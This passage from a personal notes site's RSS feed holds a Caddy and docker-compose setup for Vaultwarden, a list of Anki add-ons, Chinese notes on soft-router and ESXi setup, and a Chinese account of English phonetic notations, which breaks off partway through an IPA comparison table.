&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="color:#8b008b;font-weight:bold">version&lt;/span>:&lt;span style="color:#bbb"> &lt;/span>&lt;span style="color:#cd5555">&amp;#39;3&amp;#39;&lt;/span>&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">services&lt;/span>:&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>&lt;span style="color:#8b008b;font-weight:bold">caddy&lt;/span>:&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>&lt;span style="color:#8b008b;font-weight:bold">image&lt;/span>:&lt;span style="color:#bbb"> &lt;/span>caddy&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>&lt;span style="color:#8b008b;font-weight:bold">container_name&lt;/span>:&lt;span style="color:#bbb"> &lt;/span>caddy&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>&lt;span style="color:#8b008b;font-weight:bold">build&lt;/span>:&lt;span style="color:#bbb"> &lt;/span>.&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>&lt;span style="color:#8b008b;font-weight:bold">restart&lt;/span>:&lt;span style="color:#bbb"> &lt;/span>always&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>&lt;span style="color:#8b008b;font-weight:bold">volumes&lt;/span>:&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- ./Caddyfile:/etc/caddy/Caddyfile&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- /share/Container/caddy/data:/data&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- /share/Container/caddy/config:/config&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>&lt;span style="color:#8b008b;font-weight:bold">network_mode&lt;/span>:&lt;span style="color:#bbb"> &lt;/span>host&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>&lt;span style="color:#8b008b;font-weight:bold">environment&lt;/span>:&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- ACME_AGREE=true&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- DOMAIN_VWARDEN=https://YOUR_DOMAIN_HERE&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- LOG_FILE=/data/access.log&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- EMAIL=YOUR_EMAIL&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- SERVER_VWARDEN=127.0.0.1&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- ZEROSSL_API_KEY=&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- ALIYUN_ACCESS_KEY_ID=&lt;span style="color:#bbb">
&lt;/span>&lt;span style="color:#bbb"> &lt;/span>- ALIYUN_ACCESS_KEY_SECRET=&lt;span style="color:#bbb">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Caddyfile&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Caddyfile" data-lang="Caddyfile">&lt;span style="color:#cd5555">{$DOMAIN_VWARDEN}&lt;/span>&lt;span style="color:#000080;font-weight:bold">:443&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">log&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">level&lt;/span> &lt;span style="color:#cd5555">INFO&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">output&lt;/span> &lt;span style="color:#cd5555">file&lt;/span> &lt;span style="color:#cd5555">{$LOG_FILE}&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">roll_size&lt;/span> &lt;span style="color:#cd5555">10MB&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">roll_keep&lt;/span> &lt;span style="color:#b452cd">10&lt;/span>
}
}&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22"> # Uncomment this if you want to get a cert via ACME (Let&amp;#39;s Encrypt or ZeroSSL).
&lt;/span>&lt;span style="color:#228b22"> # Use http-01 or tls-alpn-01 chanllege
&lt;/span>&lt;span style="color:#228b22"> # tls {$EMAIL}
&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22"> # Use dns-01 chanllege
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">tls&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">issuer&lt;/span> &lt;span style="color:#cd5555">zerossl&lt;/span> &lt;span style="color:#cd5555">{$ZEROSSL_API_KEY}&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">dns&lt;/span> &lt;span style="color:#cd5555">alidns&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">access_key_id&lt;/span> &lt;span style="color:#cd5555">{$ALIYUN_ACCESS_KEY_ID}&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">access_key_secret&lt;/span> &lt;span style="color:#cd5555">{$ALIYUN_ACCESS_KEY_SECRET}&lt;/span>
}
}
}&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22"> # Or uncomment this if you&amp;#39;re providing your own cert.
&lt;/span>&lt;span style="color:#228b22"> # tls {$SSL_CERT_PATH} {$SSL_KEY_PATH}
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">encode&lt;/span> &lt;span style="color:#cd5555">zstd&lt;/span> &lt;span style="color:#cd5555">gzip&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22"> # Uncomment to improve security (WARNING: only use if you understand the implications!)
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">header&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">Strict-Transport-Security&lt;/span> &lt;span style="color:#cd5555">&amp;#34;max-age=31536000;&amp;#34;&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">X-XSS-Protection&lt;/span> &lt;span style="color:#cd5555">&amp;#34;1;&lt;/span> &lt;span style="color:#cd5555">mode=block&amp;#34;&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">X-Frame-Options&lt;/span> &lt;span style="color:#cd5555">&amp;#34;DENY&amp;#34;&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">X-Robots-Tag&lt;/span> &lt;span style="color:#cd5555">&amp;#34;none&amp;#34;&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">-Server&lt;/span>
}&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22"> # Uncomment to allow access to the admin interface only from local networks
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#707a7c">@insecureadmin&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">not&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">remote_ip&lt;/span> &lt;span style="color:#b452cd">192&lt;/span>&lt;span style="color:#cd5555">.168.0.0/16&lt;/span> &lt;span style="color:#b452cd">172&lt;/span>&lt;span style="color:#cd5555">.16.0.0/12&lt;/span> &lt;span style="color:#b452cd">10&lt;/span>&lt;span style="color:#cd5555">.0.0.0/8&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">path&lt;/span> &lt;span style="color:#cd5555">/admin*&lt;/span>
}
&lt;span style="color:#8b008b;font-weight:bold">redir&lt;/span> &lt;span style="color:#707a7c">@insecureadmin&lt;/span> &lt;span style="color:#cd5555">/&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22"> # The negotiation endpoint is also proxied to Rocket
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">reverse_proxy&lt;/span> &lt;span style="color:#707a7c">/notifications/hub/negotiate&lt;/span> vaultwarden:&lt;span style="color:#b452cd">80&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22"> # Notifications redirected to the websockets server
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">reverse_proxy&lt;/span> &lt;span style="color:#707a7c">/notifications/hub&lt;/span> &lt;span style="color:#cd5555">{$SERVER_VWARDEN}&lt;/span>&lt;span style="color:#cd5555">:3012&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22">
&lt;/span>&lt;span style="color:#228b22"> # Proxy everything else to Rocket
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">reverse_proxy&lt;/span> &lt;span style="color:#cd5555">{$SERVER_VWARDEN}&lt;/span>&lt;span style="color:#cd5555">:8012&lt;/span> {
&lt;span style="color:#8b008b;font-weight:bold">header_up&lt;/span> &lt;span style="color:#cd5555">X-Real-IP&lt;/span> &lt;span style="color:#cd5555">{remote_host}&lt;/span>
}
}
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Docs: anki</title><link>https://note.codiy.net/docs/2022/01/anki/</link><pubDate>Wed, 05 Jan 2022 17:31:00 +0800</pubDate><guid>https://note.codiy.net/docs/2022/01/anki/</guid><description>
&lt;h2 id="anki">Anki&lt;/h2>
&lt;h3 id="awesome-anki">Awesome-anki&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://github.com/tianshanghong/awesome-anki">tianshanghong/awesome-anki&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="add-onsrequired">Add-ons(required)&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://github.com/glutanimate/review-heatmap/">Review Heatmap&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1210908941">Custom Background Image and Gear Icon&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1049863218">No Distractions Full Screen: Clean review interface + Tablet/Touch support&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/2055492159">AnkiConnect&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/867316254">Minimal Theme&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1556734708">More Decks Stats and Time Left&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/2494384865">Button Colours (Good, Again)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/805891399">extended editor for field (for tables, search&amp;amp;replace, &amp;hellip;)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/31746032">AnkiWebView Inspector&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1898445115">Advanced Copy Fields&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/266436365">Progress Graphs and Stats for Learned and Matured Cards&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/814349176">AwesomeTTS (Google Cloud Text-to-Speech &amp;amp; Microsoft Azure TTS) [unofficial]&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/874215009">Advanced Browser&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/225180905">Highlight Search Results in the Browser&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/46611790">Fastbar- with nightmode support&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1760080335">Always On Top&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/498789867">Replay buttons on card&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1788670778">CrowdAnki: JSON export&amp;amp;import. Edit history. Collaborate on deck creation.&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1896168623">Collapsible Fields&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1374772155">Image Occlusion Enhanced for Anki 2.1 (alpha)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/24411424">Customize Keyboard Shortcuts&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/877182321">Enhance main window&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/295889520">Mini Format Pack&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1996266159">External Note Editor for the Browser&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="add-ons">Add-ons()&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/775418273">Word Query&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1781298089">Searching, PDF Reading &amp;amp; Note-Taking in Add Dialog&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="add-onslooks-no-bad">Add-ons(Looks no bad)&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1899278645">Custom Styles (font color, background colour, classes)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/glutanimate/cloze-overlapper">cloze overlapper&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1783260740">Add Cards - Web Browser&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/85158043">Minimize to tray&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/374005964">The KING of Button Add-ons&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/323586997">(Legacy) ReMemorize™: Rescheduler with sibling and logging (v1.4.2)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/939347702">Watch Foreign Language Movies with Anki&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1052724801">BetterSearch&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/858591644">anki-forvo-dl • Forvo Pronunciation Downloader (fully automatic)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1152543397">Postpone card&amp;rsquo;s review&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/561924305">Batch Download Pictures From Google Images&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1508357010">Remaining time (for Anki 2.1)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1463041493">Syntax Highlighting for Code&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1666520655">Migaku Retirement&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/1655992655">Migaku Dictionary&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/831846358">Browser: Table/Editor side-by-side (horizontal split)&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="add-onswaiting-for-supported-latest-version">Add-ons(Waiting for supported latest version)&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://ankiweb.net/shared/info/516643804">Frozen Fields&lt;/a>&lt;/li>
&lt;li>&lt;/li>
&lt;/ul>
&lt;h3 id="templates-note-type">Templates (Note Type)&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://github.com/Troyciv/anki-templates-superlist">Troyciv/anki-templates-superlist&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/bikenik/Anki_Templates">Anki_Templates&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/TunkShif/Anki-Azul-Template">Anki-Azul-Template&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/Jfaler/Anki-Card-Templates">Anki-Card-Templates&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/git9527/anki-awesome-select">anki-awesome-select&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/Z233/anki-template-shanbay">Z233/anki-template-shanbay&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/faneca/anki-purejs-media-random">anki-purejs-media-random&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="notes-cards-note-types-card-types">Notes, Cards, Note Types, Card Types&lt;/h3>
&lt;h3 id="preference-settings">Preference settings&lt;/h3>
&lt;ul>
&lt;li>In the &amp;ldquo;Scheduling&amp;rdquo; tab, uncheck the &amp;ldquo;Show next review time above answer buttons&amp;rdquo;.&lt;/li>
&lt;/ul>
&lt;h3 id="decks-option-group-settings">Deck&amp;rsquo;s Option Group Settings&lt;/h3>
&lt;ul>
&lt;li>Create Option Group for your decks, such as &amp;ldquo;Sentence Cards&amp;rdquo;, and &amp;ldquo;Vocabulary Cards&amp;rdquo;, etc.&lt;/li>
&lt;li>&amp;ldquo;Maximum reviews/day&amp;rdquo; option in the &amp;ldquo;Reviews&amp;rdquo; tab of the Deck Options Window to 9999, default is 200.&lt;/li>
&lt;li>In the &amp;ldquo;Lapses&amp;rdquo; tab, Type 20% into the &amp;ldquo;New Interval&amp;rdquo; number input&lt;/li>
&lt;/ul></description></item><item><title>Docs: All In One</title><link>https://note.codiy.net/docs/2022/01/all-in-one/</link><pubDate>Wed, 05 Jan 2022 17:30:19 +0800</pubDate><guid>https://note.codiy.net/docs/2022/01/all-in-one/</guid><description>
&lt;h2 id="宽带与光猫">宽带与光猫&lt;/h2>
&lt;ul>
&lt;li>宽带是否支持多播&lt;/li>
&lt;li>光猫管理员账号密码&lt;/li>
&lt;li>光猫由路由模式设置为桥接模式&lt;/li>
&lt;li>拨号发现为局域网IP, 打给客服要求分配公网IP&lt;/li>
&lt;/ul>
&lt;h2 id="软路由">软路由&lt;/h2>
&lt;ul>
&lt;li>CPU: J4125&lt;/li>
&lt;li>网卡 i210 or i211 千兆网卡&lt;/li>
&lt;li>内存条&lt;/li>
&lt;li>存储&lt;/li>
&lt;/ul>
&lt;h2 id="esxi">ESXi&lt;/h2>
&lt;ul>
&lt;li>官网镜像下载, ventoy 制作启动U盘&lt;/li>
&lt;li>开机进 BIOS 选择引导方式优先级&lt;/li>
&lt;li>进入 ESXi 安装界面, 快速按 Shift + o, 输入命令 限制缓存用的磁盘大小&lt;/li>
&lt;li>安装完后, 管理网口选到 eht0, 然后设置IP地址&lt;/li>
&lt;li>用网线将 eth0 与电脑连接。&lt;/li>
&lt;li>电脑上设置IPV4属性，使得可以桥接到 ESXi.&lt;/li>
&lt;li>电脑上浏览器输入 ESXi 管理地址，进行虚拟机管理.&lt;/li>
&lt;/ul>
&lt;h2 id="ros">ROS&lt;/h2>
&lt;h2 id="openwrt">OpenWrt&lt;/h2>
&lt;h2 id="光猫路由网关交换机网桥dnsdhcp-nat">光猫，路由，网关，交换机，网桥，DNS，DHCP, NAT&lt;/h2>
&lt;h2 id="references">References&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://github.com/aimuch/iAI/blob/main/src/softRoute/softroute.md">aimuch/iAI&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Docs: English Phonetic Symbol</title><link>https://note.codiy.net/docs/2022/01/english-phonetic-symbol/</link><pubDate>Wed, 05 Jan 2022 13:11:52 +0800</pubDate><guid>https://note.codiy.net/docs/2022/01/english-phonetic-symbol/</guid><description>
&lt;h2 id="音标的历史">音标的历史&lt;/h2>
&lt;h3 id="ipa国际音标">IPA国际音标&lt;/h3>
&lt;p>国际音标（广义），又称国际语音字母（英文International Phonetic Alphabet，简称IPA），以拉丁字母为基础的一套用来标音的系统，是用于为全世界所有语言注音的符号系统。其最早源于1888年，由国际语音协会(International Phonetic Association)设计的。&lt;/p>
&lt;h3 id="英国音标-daniel-jonesdj音标-gimson-clive-upton">英国音标: Daniel Jones(DJ音标), Gimson, Clive Upton&lt;/h3>
&lt;p>DJ音标跟英国语音学家Daniel Jones有关（名字首字母Ｄ和Ｊ）。他根据IPA编了一本英国英语的发音辞典English Pronouncing Dictionary（第1版至第12版，最后一版的出版时间为1963）。他所编的英语发音字典代表了被称为 “Received Pronunciation”（RP）（标准发音）的读音，这在受过教育的英国人尤其是南部英格兰人中通用。&lt;/p>
&lt;p>凡是英语教学或学习辞典，只要是教英国音的，无不奉这本辞典为圭臬。&lt;/p>
&lt;p>可是到了现在，这种标准已经过时落伍了。英国另一位语音学家A. C. Gimson（他是Daniel Jones的学生，英国伦敦大学的语音学教授），将英国英语的辞典发音做了一番修正（第13版，1977；第14版，1988），使它更能代表实际发音。&lt;/p>
&lt;p>后来又有牛津的 Clive Upton 在 Gimson 的版本上修改了5个元音符号, 被用在牛津词典当中, 参见&lt;a href="http://www.yek.me.uk/ipadicts.html">IPA vowel symbols for British English in dictionaries&lt;/a>&lt;/p>
&lt;h3 id="美国音标-kenyonknottkk音标">美国音标: Kenyon&amp;amp;Knott(KK音标)&lt;/h3>
&lt;p>KK音标也是国际音标的一种，是《美式英语发音辞典》（A Pronouncing Dictionary of American English）所使用的音标，由美国两位语言学家John S. Kenyou和Thomas A. Knott共同研究出来。由于两位作者的姓皆以K开头，所以一般称为KK音标。&lt;/p>
&lt;p>而由于教育传统等原因，美国本土的学生并不学习KK音标，而是使用更能标示他们实际发音习惯的重拼法（respelling）或Merriam-Webster’s系列词典使用的标音法（有的译为韦氏音标）。像apathy这个单词，传统式重拼法就标音为（ap-ath-ee）。&lt;/p>
&lt;p>如，美国传统词典音标AHD（American Heritage Dictionary）的标音方法属于重拼法。如今，为了方便交流（或者商业利益？），也有越来越多的英国母语辞典也改用国际音标，有的还营销到国外，而美国辞典则大都停留在使用各自的重拼法来注音。&lt;/p>
&lt;ul>
&lt;li>IPA63(DJ音标）、KK音标和IPA88（新版DJ音标）的对比图
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/b59d2cafcd6fea152fca2f8f0de8d27a1626681776.jpg"
alt=""
/>
&lt;/p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/fc800dcae6ea400a6af06c81daca203f1626681873.jpg"
alt=""
/>
&lt;/p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/1e2d81d1591f9f4a552831aba6f918971626681905.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;h2 id="ipa英语音标对照表">IPA英语音标对照表&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Pronunciation_respelling_for_English#International_Phonetic_Alphabet">Comparison of the IPA variants for English&lt;/a>&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">Lexical sets&lt;/th>
&lt;th style="text-align:center">Jones&lt;/th>
&lt;th style="text-align:center">Gimson&lt;/th>
&lt;th style="text-align:center">Upton&lt;/th>
&lt;th style="text-align:center">Kenyon&amp;amp;Knott&lt;/th>
&lt;th style="text-align:center">Roach et al.&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">FLEECE&lt;/td>
&lt;td style="text-align:center">iː&lt;/td>
&lt;td style="text-align:center">iː&lt;/td>
&lt;td style="text-align:center">iː&lt;/td>
&lt;td style="text-align:center">i&lt;/td>
&lt;td style="text-align:center">iː&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">KIT&lt;/td>
&lt;td style="text-align:center">i&lt;/td>
&lt;td style="text-align:center">ɪ&lt;/td>
&lt;td style="text-align:center">ɪ&lt;/td>
&lt;td style="text-align:center">ɪ&lt;/td>
&lt;td style="text-align:center">ɪ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">DRESS&lt;/td>
&lt;td style="text-align:center">e&lt;/td>
&lt;td style="text-align:center">e&lt;/td>
&lt;td style="text-align:center">ɛ&lt;/td>
&lt;td style="text-align:center">ɛ&lt;/td>
&lt;td style="text-align:center">e&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">TRAP&lt;/td>
&lt;td style="text-align:center">æ&lt;/td>
&lt;td style="text-align:center">æ&lt;/td>
&lt;td style="text-align:center">a&lt;/td>
&lt;td style="text-align:center">æ&lt;/td>
&lt;td style="text-align:center">æ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">START&lt;/td>
&lt;td style="text-align:center">ɑː&lt;/td>
&lt;td style="text-align:center">ɑː&lt;/td>
&lt;td style="text-align:center">ɑː&lt;/td>
&lt;td style="text-align:center">ɑr~ɑː&lt;/td>
&lt;td style="text-align:center">ɑːr&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">PALM&lt;/td>
&lt;td style="text-align:center">ɑː&lt;/td>
&lt;td style="text-align:center">ɑː&lt;/td>
&lt;td style="text-align:center">ɑː&lt;/td>
&lt;td style="text-align:center">ɑ&lt;/td>
&lt;td style="text-align:center">ɑː&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">LOT&lt;/td>
&lt;td style="text-align:center">ɔ&lt;/td>
&lt;td style="text-align:center">ɒ&lt;/td>
&lt;td style="text-align:center">ɒ&lt;/td>
&lt;td style="text-align:center">ɑ~ɒ&lt;/td>
&lt;td style="text-align:center">ɑː&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">THOUGHT&lt;/td>
&lt;td style="text-align:center">ɔː&lt;/td>
&lt;td style="text-align:center">ɔː&lt;/td>
&lt;td style="text-align:center">ɔː&lt;/td>
&lt;td style="text-align:center">ɔ&lt;/td>
&lt;td style="text-align:center">ɔː&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">NORTH&lt;/td>
&lt;td style="text-align:center">ɔː&lt;/td>
&lt;td style="text-align:center">ɔː&lt;/td>
&lt;td style="text-align:center">ɔː&lt;/td>
&lt;td style="text-align:center">ɔr~ɔə&lt;/td>
&lt;td style="text-align:center">ɔːr&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">FOOT&lt;/td>
&lt;td style="text-align:center">u&lt;/td>
&lt;td style="text-align:center">ʊ&lt;/td>
&lt;td style="text-align:center">ʊ&lt;/td>
&lt;td style="text-align:center">ᴜ&lt;/td>
&lt;td style="text-align:center">ʊ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">GOOSE&lt;/td>
&lt;td style="text-align:center">uː&lt;/td>
&lt;td style="text-align:center">uː&lt;/td>
&lt;td style="text-align:center">uː&lt;/td>
&lt;td style="text-align:center">u&lt;/td>
&lt;td style="text-align:center">uː&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">STRUT&lt;/td>
&lt;td style="text-align:center">ʌ&lt;/td>
&lt;td style="text-align:center">ʌ&lt;/td>
&lt;td style="text-align:center">ʌ&lt;/td>
&lt;td style="text-align:center">ʌ&lt;/td>
&lt;td style="text-align:center">ʌ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">NURSE&lt;/td>
&lt;td style="text-align:center">əː&lt;/td>
&lt;td style="text-align:center">ɜː&lt;/td>
&lt;td style="text-align:center">əː&lt;/td>
&lt;td style="text-align:center">ɝ~ɜ&lt;/td>
&lt;td style="text-align:center">ɝː&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">LETTER&lt;/td>
&lt;td style="text-align:center">ə&lt;/td>
&lt;td style="text-align:center">ə&lt;/td>
&lt;td style="text-align:center">ə&lt;/td>
&lt;td style="text-align:center">ɚ~ə&lt;/td>
&lt;td style="text-align:center">ɚ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">COMMA&lt;/td>
&lt;td style="text-align:center">ə&lt;/td>
&lt;td style="text-align:center">ə&lt;/td>
&lt;td style="text-align:center">ə&lt;/td>
&lt;td style="text-align:center">ə&lt;/td>
&lt;td style="text-align:center">ə&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">FACE&lt;/td>
&lt;td style="text-align:center">ei&lt;/td>
&lt;td style="text-align:center">eɪ&lt;/td>
&lt;td style="text-align:center">eɪ&lt;/td>
&lt;td style="text-align:center">e&lt;/td>
&lt;td style="text-align:center">eɪ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">GOAT&lt;/td>
&lt;td style="text-align:center">ou&lt;/td>
&lt;td style="text-align:center">əʊ&lt;/td>
&lt;td style="text-align:center">əʊ&lt;/td>
&lt;td style="text-align:center">o&lt;/td>
&lt;td style="text-align:center">oʊ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">PRICE&lt;/td>
&lt;td style="text-align:center">ai&lt;/td>
&lt;td style="text-align:center">aɪ&lt;/td>
&lt;td style="text-align:center">ʌɪ&lt;/td>
&lt;td style="text-align:center">aɪ&lt;/td>
&lt;td style="text-align:center">aɪ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">MOUTH&lt;/td>
&lt;td style="text-align:center">au~ɑu&lt;/td>
